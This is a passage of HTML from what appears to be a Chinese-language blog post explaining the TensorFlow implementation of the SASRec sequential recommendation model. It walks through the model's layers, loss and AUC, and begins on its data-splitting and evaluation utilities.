class=\"literal\">True</span>,</span><br><span class=\"line\">                                                   scope=<span class=\"string\">&quot;self_attention&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># Feed forward</span></span><br><span class=\"line\">                    self.seq = feedforward(normalize(self.seq), num_units=[args.hidden_units, args.hidden_units],</span><br><span class=\"line\">                                           dropout_rate=args.dropout_rate, is_training=self.is_training)</span><br><span class=\"line\">                    self.seq *= mask</span><br><span class=\"line\"></span><br><span class=\"line\">            self.seq = normalize(self.seq)</span><br><span class=\"line\"></span><br><span class=\"line\">        pos = tf.reshape(pos, [tf.shape(self.input_seq)[<span class=\"number\">0</span>] * args.maxlen])</span><br><span class=\"line\">        neg = tf.reshape(neg, [tf.shape(self.input_seq)[<span class=\"number\">0</span>] * args.maxlen])</span><br><span class=\"line\">        pos_emb = tf.nn.embedding_lookup(item_emb_table, pos)</span><br><span class=\"line\">        neg_emb = tf.nn.embedding_lookup(item_emb_table, neg)</span><br><span class=\"line\">        seq_emb = tf.reshape(self.seq, [tf.shape(self.input_seq)[<span class=\"number\">0</span>] * args.maxlen, args.hidden_units])</span><br><span class=\"line\"></span><br><span class=\"line\">        self.test_item = tf.placeholder(tf.int32, shape=(<span class=\"number\">101</span>))</span><br><span class=\"line\">        test_item_emb = tf.nn.embedding_lookup(item_emb_table, self.test_item)</span><br><span class=\"line\">        self.test_logits = tf.matmul(seq_emb, tf.transpose(test_item_emb))</span><br><span class=\"line\">        self.test_logits = tf.reshape(self.test_logits, [tf.shape(self.input_seq)[<span class=\"number\">0</span>], args.maxlen, <span class=\"number\">101</span>])</span><br><span class=\"line\">        self.test_logits = self.test_logits[:, -<span class=\"number\">1</span>, :]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># prediction layer</span></span><br><span class=\"line\">        self.pos_logits = tf.reduce_sum(pos_emb * seq_emb, -<span class=\"number\">1</span>)</span><br><span class=\"line\">        self.neg_logits = tf.reduce_sum(neg_emb * seq_emb, -<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># ignore padding items (0)</span></span><br><span class=\"line\">        istarget = tf.reshape(tf.to_float(tf.not_equal(pos, <span class=\"number\">0</span>)), [tf.shape(self.input_seq)[<span class=\"number\">0</span>] * args.maxlen])</span><br><span class=\"line\">        self.loss = tf.reduce_sum(</span><br><span class=\"line\">            - tf.log(tf.sigmoid(self.pos_logits) + <span class=\"number\">1e-24</span>) * istarget -</span><br><span class=\"line\">            tf.log(<span class=\"number\">1</span> - tf.sigmoid(self.neg_logits) + <span class=\"number\">1e-24</span>) * istarget</span><br><span class=\"line\">        ) / tf.reduce_sum(istarget)</span><br><span class=\"line\">        reg_losses = tf.get_collection(tf.GraphKeys.REGULARIZATION_LOSSES)</span><br><span class=\"line\">        self.loss += <span class=\"built_in\">sum</span>(reg_losses)</span><br><span class=\"line\"></span><br><span class=\"line\">        tf.summary.scalar(<span class=\"string\">&#x27;loss&#x27;</span>, self.loss)</span><br><span class=\"line\">        self.auc = tf.reduce_sum(</span><br><span class=\"line\">            ((tf.sign(self.pos_logits - self.neg_logits) + <span class=\"number\">1</span>) / <span class=\"number\">2</span>) * istarget</span><br><span class=\"line\">        ) / tf.reduce_sum(istarget)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> reuse <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            tf.summary.scalar(<span class=\"string\">&#x27;auc&#x27;</span>, self.auc)</span><br><span class=\"line\">            self.global_step = tf.Variable(<span class=\"number\">0</span>, name=<span class=\"string\">&#x27;global_step&#x27;</span>, trainable=<span class=\"literal\">False</span>)</span><br><span class=\"line\">            self.optimizer = tf.train.AdamOptimizer(learning_rate=args.lr, beta2=<span class=\"number\">0.98</span>)</span><br><span class=\"line\">            self.train_op = self.optimizer.minimize(self.loss, global_step=self.global_step)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            tf.summary.scalar(<span class=\"string\">&#x27;test_auc&#x27;</span>, self.auc)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.merged = tf.summary.merge_all()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">predict</span>(<span class=\"params\">self, sess, u, seq, item_idx</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sess.run(self.test_logits,</span><br><span class=\"line\">                        &#123;self.u: u, self.input_seq: seq, self.test_item: item_idx, self.is_training: <span class=\"literal\">False</span>&#125;)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"初始化方法-__init__\"><a class=\"anchor\" href=\"#初始化方法-__init__\">#</a> 初始化方法  <code>__init__</code></h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, usernum, itemnum, args, reuse=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    self.is_training = tf.placeholder(tf.<span class=\"built_in\">bool</span>, shape=())</span><br><span class=\"line\">    self.u = tf.placeholder(tf.int32, shape=(<span class=\"literal\">None</span>))</span><br><span class=\"line\">    self.input_seq = tf.placeholder(tf.int32, shape=(<span class=\"literal\">None</span>, args.maxlen))</span><br><span class=\"line\">    self.pos = tf.placeholder(tf.int32, shape=(<span class=\"literal\">None</span>, args.maxlen))</span><br><span class=\"line\">    self.neg = tf.placeholder(tf.int32, shape=(<span class=\"literal\">None</span>, args.maxlen))</span><br><span class=\"line\">    pos = self.pos</span><br><span class=\"line\">    neg = self.neg</span><br><span class=\"line\">    mask = tf.expand_dims(tf.to_float(tf.not_equal(self.input_seq, <span class=\"number\">0</span>)), -<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>作用：定义一些占位符，用于接收输入数据。\n<ul>\n<li><code>self.is_training</code> ：一个布尔型占位符，用于指示是否在训练模式。</li>\n<li><code>self.u</code> ：用户 ID 占位符。</li>\n<li><code>self.input_seq</code> ：输入序列的占位符。</li>\n<li><code>self.pos</code>  和  <code>self.neg</code> ：正样本和负样本的占位符。</li>\n<li><code>mask</code> ：掩码，用于掩盖输入序列中的填充值（0）。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"变量域-sasrec-和嵌入层\"><a class=\"anchor\" href=\"#变量域-sasrec-和嵌入层\">#</a> 变量域 &quot;SASRec&quot; 和嵌入层</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">with</span> tf.variable_scope(<span class=\"string\">&quot;SASRec&quot;</span>, reuse=reuse):</span><br><span class=\"line\">    <span class=\"comment\"># sequence embedding, item embedding table</span></span><br><span class=\"line\">    self.seq, item_emb_table = embedding(self.input_seq,</span><br><span class=\"line\">                                         vocab_size=itemnum + <span class=\"number\">1</span>,</span><br><span class=\"line\">                                         num_units=args.hidden_units,</span><br><span class=\"line\">                                         zero_pad=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                                         scale=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                                         l2_reg=args.l2_emb,</span><br><span class=\"line\">                                         scope=<span class=\"string\">&quot;input_embeddings&quot;</span>,</span><br><span class=\"line\">                                         with_t=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                                         reuse=reuse</span><br><span class=\"line\">                                         )</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>作用：将输入序列进行嵌入，生成嵌入矩阵和项目嵌入表。\n<ul>\n<li><code>embedding</code>  函数：实现输入序列的嵌入，返回嵌入后的序列和嵌入表。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"位置编码-2\"><a class=\"anchor\" href=\"#位置编码-2\">#</a> 位置编码</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">t, pos_emb_table = embedding(</span><br><span class=\"line\">    tf.tile(tf.expand_dims(tf.<span class=\"built_in\">range</span>(tf.shape(self.input_seq)[<span class=\"number\">1</span>]), <span class=\"number\">0</span>), [tf.shape(self.input_seq)[<span class=\"number\">0</span>], <span class=\"number\">1</span>]),</span><br><span class=\"line\">    vocab_size=args.maxlen,</span><br><span class=\"line\">    num_units=args.hidden_units,</span><br><span class=\"line\">    zero_pad=<span class=\"literal\">False</span>,</span><br><span class=\"line\">    scale=<span class=\"literal\">False</span>,</span><br><span class=\"line\">    l2_reg=args.l2_emb,</span><br><span class=\"line\">    scope=<span class=\"string\">&quot;dec_pos&quot;</span>,</span><br><span class=\"line\">    reuse=reuse,</span><br><span class=\"line\">    with_t=<span class=\"literal\">True</span></span><br><span class=\"line\">)</span><br><span class=\"line\">self.seq += t</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>作用：对序列进行位置编码，添加位置信息到序列嵌入中。\n<ul>\n<li><code>embedding</code>  函数：实现位置编码的嵌入，返回位置编码向量和位置嵌入表。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"dropout-2\"><a class=\"anchor\" href=\"#dropout-2\">#</a> Dropout</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">self.seq = tf.layers.dropout(self.seq,</span><br><span class=\"line\">                             rate=args.dropout_rate,</span><br><span class=\"line\">                             training=tf.convert_to_tensor(self.is_training))</span><br><span class=\"line\">self.seq *= mask</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>作用</strong>：对序列嵌入进行 dropout 操作，并应用掩码。</li>\n</ul>\n<h3 id=\"构建自注意力机制的块\"><a class=\"anchor\" href=\"#构建自注意力机制的块\">#</a> 构建自注意力机制的块</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(args.num_blocks):</span><br><span class=\"line\">    <span class=\"keyword\">with</span> tf.variable_scope(<span class=\"string\">&quot;num_blocks_%d&quot;</span> % i):</span><br><span class=\"line\">        <span class=\"comment\"># Self-attention</span></span><br><span class=\"line\">        self.seq = multihead_attention(queries=normalize(self.seq),</span><br><span class=\"line\">                                       keys=self.seq,</span><br><span class=\"line\">                                       num_units=args.hidden_units,</span><br><span class=\"line\">                                       num_heads=args.num_heads,</span><br><span class=\"line\">                                       dropout_rate=args.dropout_rate,</span><br><span class=\"line\">                                       is_training=self.is_training,</span><br><span class=\"line\">                                       causality=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                                       scope=<span class=\"string\">&quot;self_attention&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># Feed forward</span></span><br><span class=\"line\">        self.seq = feedforward(normalize(self.seq), num_units=[args.hidden_units, args.hidden_units],</span><br><span class=\"line\">                               dropout_rate=args.dropout_rate, is_training=self.is_training)</span><br><span class=\"line\">        self.seq *= mask</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>作用：构建多个自注意力机制块，每个块包括自注意力层和前馈神经网络层。\n<ul>\n<li><code>multihead_attention</code>  函数：实现多头自注意力机制。</li>\n<li><code>feedforward</code>  函数：实现前馈神经网络层。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"归一化-2\"><a class=\"anchor\" href=\"#归一化-2\">#</a> 归一化</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">self.seq = normalize(self.seq)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>作用</strong>：对序列进行归一化处理。</li>\n</ul>\n<h3 id=\"计算正负样本的嵌入和预测得分\"><a class=\"anchor\" href=\"#计算正负样本的嵌入和预测得分\">#</a> 计算正负样本的嵌入和预测得分</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pos = tf.reshape(pos, [tf.shape(self.input_seq)[<span class=\"number\">0</span>] * args.maxlen])</span><br><span class=\"line\">neg = tf.reshape(neg, [tf.shape(self.input_seq)[<span class=\"number\">0</span>] * args.maxlen])</span><br><span class=\"line\">pos_emb = tf.nn.embedding_lookup(item_emb_table, pos)</span><br><span class=\"line\">neg_emb = tf.nn.embedding_lookup(item_emb_table, neg)</span><br><span class=\"line\">seq_emb = tf.reshape(self.seq, [tf.shape(self.input_seq)[<span class=\"number\">0</span>] * args.maxlen, args.hidden_units])</span><br><span class=\"line\"></span><br><span class=\"line\">self.test_item = tf.placeholder(tf.int32, shape=(<span class=\"number\">101</span>))</span><br><span class=\"line\">test_item_emb = tf.nn.embedding_lookup(item_emb_table, self.test_item)</span><br><span class=\"line\">self.test_logits = tf.matmul(seq_emb, tf.transpose(test_item_emb))</span><br><span class=\"line\">self.test_logits = tf.reshape(self.test_logits, [tf.shape(self.input_seq)[<span class=\"number\">0</span>], args.maxlen, <span class=\"number\">101</span>])</span><br><span class=\"line\">self.test_logits = self.test_logits[:, -<span class=\"number\">1</span>, :]</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>作用</strong>：计算正样本和负样本的嵌入，并通过矩阵乘法得到预测得分。</li>\n</ul>\n<h3 id=\"损失函数\"><a class=\"anchor\" href=\"#损失函数\">#</a> 损失函数</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">self.pos_logits = tf.reduce_sum(pos_emb * seq_emb, -<span class=\"number\">1</span>)</span><br><span class=\"line\">self.neg_logits = tf.reduce_sum(neg_emb * seq_emb, -<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">istarget = tf.reshape(tf.to_float(tf.not_equal(pos, <span class=\"number\">0</span>)), [tf.shape(self.input_seq)[<span class=\"number\">0</span>] * args.maxlen])</span><br><span class=\"line\">self.loss = tf.reduce_sum(</span><br><span class=\"line\">    - tf.log(tf.sigmoid(self.pos_logits) + <span class=\"number\">1e-24</span>) * istarget -</span><br><span class=\"line\">    tf.log(<span class=\"number\">1</span> - tf.sigmoid(self.neg_logits) + <span class=\"number\">1e-24</span>) * istarget</span><br><span class=\"line\">) / tf.reduce_sum(istarget)</span><br><span class=\"line\">reg_losses = tf.get_collection(tf.GraphKeys.REGULARIZATION_LOSSES)</span><br><span class=\"line\">self.loss += <span class=\"built_in\">sum</span>(reg_losses)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>作用</strong>：计算模型的损失函数，包含正负样本的二元交叉熵损失和正则化损失。</li>\n</ul>\n<h3 id=\"auc和优化器\"><a class=\"anchor\" href=\"#auc和优化器\">#</a> AUC 和优化器</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tf.summary.scalar(<span class=\"string\">&#x27;loss&#x27;</span>, self.loss)</span><br><span class=\"line\">self.auc = tf.reduce_sum(</span><br><span class=\"line\">    ((tf.sign(self.pos_logits - self.neg_logits) + <span class=\"number\">1</span>) / <span class=\"number\">2</span>) * istarget</span><br><span class=\"line\">) / tf.reduce_sum(istarget)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> reuse <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">    tf.summary.scalar(<span class=\"string\">&#x27;auc&#x27;</span>, self.auc)</span><br><span class=\"line\">    self.global_step = tf.Variable(<span class=\"number\">0</span>, name=<span class=\"string\">&#x27;global_step&#x27;</span>, trainable=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    self.optimizer = tf.train.AdamOptimizer(learning_rate=args.lr, beta2=<span class=\"number\">0.98</span>)</span><br><span class=\"line\">    self.train_op = self.optimizer.minimize(self.loss, global_step=self.global_step)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    tf.summary.scalar(<span class=\"string\">&#x27;test_auc&#x27;</span>, self.auc)</span><br><span class=\"line\"></span><br><span class=\"line\">self.merged = tf.summary.merge_all()</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>作用</strong>：定义 AUC 指标和优化器，如果 reuse 为 None 则初始化训练操作，否则记录测试 AUC。</li>\n</ul>\n<h3 id=\"预测函数-predict\"><a class=\"anchor\" href=\"#预测函数-predict\">#</a> 预测函数  <code>predict</code></h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">predict</span>(<span class=\"params\">self, sess, u, seq, item_idx</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sess.run(self.test_logits,</span><br><span class=\"line\">                    &#123;self.u: u, self.input_seq: seq, self.test_item: item_idx, self.is_training: <span class=\"literal\">False</span>&#125;)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>作用</strong>：定义预测函数，接收会话、用户 ID、输入序列和项目索引，返回预测得分。</li>\n</ul>\n<h2 id=\"utilpy\"><a class=\"anchor\" href=\"#utilpy\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL3V0aWwucHk=\">util.py</span></h2>\n<p>这个代码包含了数据分割函数和模型评估函数，具体解析如下：</p>\n<ol>\n<li><strong>数据分割函数  <code>data_partition</code> </strong>：读取用户 - 物品交互数据，分割成训练集、验证集和测试集，并计算用户数和物品数。</li>\n<li><strong>模型评估函数  <code>evaluate</code> </strong>：在测试集上评估模型表现，计算 NDCG 和 HT。</li>\n<li><strong>模型评估函数（验证集）  <code>evaluate_valid</code> </strong>：在验证集上评估模型表现，计算 NDCG 和 HT。</li>\n</ol>\n<p>这些功能共同构成了一个基本的推荐系统数据处理和评估框架。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> copy</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> defaultdict</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">data_partition</span>(<span class=\"params\">fname</span>):</span><br><span class=\"line\">    usernum = <span class=\"number\">0</span></span><br><span class=\"line\">    itemnum = <span class=\"number\">0</span></span><br><span class=\"line\">    User = defaultdict(<span class=\"built_in\">list</span>)</span><br><span class=\"line\">    user_train = &#123;&#125;</span><br><span class=\"line\">    user_valid = &#123;&#125;</span><br><span class=\"line\">    user_test = &#123;&#125;</span><br><span class=\"line\">    <span class=\"comment\"># assume user/item index starting from 1</span></span><br><span class=\"line\">    f = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;data/%s.txt&#x27;</span> % fname, <span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">        u, i = line.rstrip().split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">        u = <span class=\"built_in\">int</span>(u)</span><br><span class=\"line\">        i = <span class=\"built_in\">int</span>(i)</span><br><span class=\"line\">        usernum = <span class=\"built_in\">max</span>(u, usernum)</span><br><span class=\"line\">        itemnum = <span class=\"built_in\">max</span>(i, itemnum)</span><br><span class=\"line\">        User[u].append(i)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> user <span class=\"keyword\">in</span> User:</span><br><span class=\"line\">        nfeedback = <span class=\"built_in\">len</span>(User[user])</span><br><span class=\"line\">        <span class=\"keyword\">if</span> nfeedback &lt; <span class=\"number\">3</span>:</span><br><span class=\"line\">            user_train[user] = User[user]</span><br><span class=\"line\">            user_valid[user] = []</span><br><span class=\"line\">            user_test[user] = []</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            user_train[user] = User[user][:-<span class=\"number\">2</span>]</span><br><span class=\"line\">            user_valid[user] = []</span><br><span class=\"line\">            user_valid[user].append(User[user][-<span class=\"number\">2</span>])</span><br><span class=\"line\">            user_test[user] = []</span><br><span class=\"line\">            user_test[user].append(User[user][-<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [user_train, user_valid, user_test, usernum, itemnum]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">evaluate</span>(<span class=\"params\">model, dataset, args, sess</span>):</span><br><span class=\"line\">    [train, valid, test, usernum, itemnum] = copy.deepcopy(dataset)</span><br><span class=\"line\"></span><br><span class=\"line\">    NDCG = <span class=\"number\">0.0</span></span><br><span class=\"line\">    HT = <span class=\"number\">0.0</span></span><br><span class=\"line\">    valid_user = <span class=\"number\">0.0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> usernum&gt;<span class=\"number\">10000</span>:</span><br><span class=\"line\">        users = random.sample(xrange(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>), <span class=\"number\">10000</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        users = xrange(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> users:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(train[u]) &lt; <span class=\"number\">1</span> <span class=\"keyword\">or</span> <span class=\"built_in\">len</span>(test[u]) &lt; <span class=\"number\">1</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">        seq = np.zeros([args.maxlen], dtype=np.int32)</span><br><span class=\"line\">        idx = args.maxlen - <span class=\"number\">1</span></span><br><span class=\"line\">        seq[idx] = valid[u][<span class=\"number\">0</span>]</span><br><span class=\"line\">        idx -= <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(train[u]):</span><br><span class=\"line\">            seq[idx] = i</span><br><span class=\"line\">            idx -= <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> idx == -<span class=\"number\">1</span>: <span class=\"keyword\">break</span></span><br><span class=\"line\">        rated = <span class=\"built_in\">set</span>(train[u])</span><br><span class=\"line\">        rated.add(<span class=\"number\">0</span>)</span><br><span class=\"line\">        item_idx = [test[u][<span class=\"number\">0</span>]]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">            t = np.random.randint(<span class=\"number\">1</span>, itemnum + <span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">while</span> t <span class=\"keyword\">in</span> rated: t = np.random.randint(<span class=\"number\">1</span>, itemnum + <span class=\"number\">1</span>)</span><br><span class=\"line\">            item_idx.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">        predictions = -model.predict(sess, [u], [seq], item_idx)</span><br><span class=\"line\">        predictions = predictions[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        rank = predictions.argsort().argsort()[<span class=\"number\">0</span>]</span><br><span 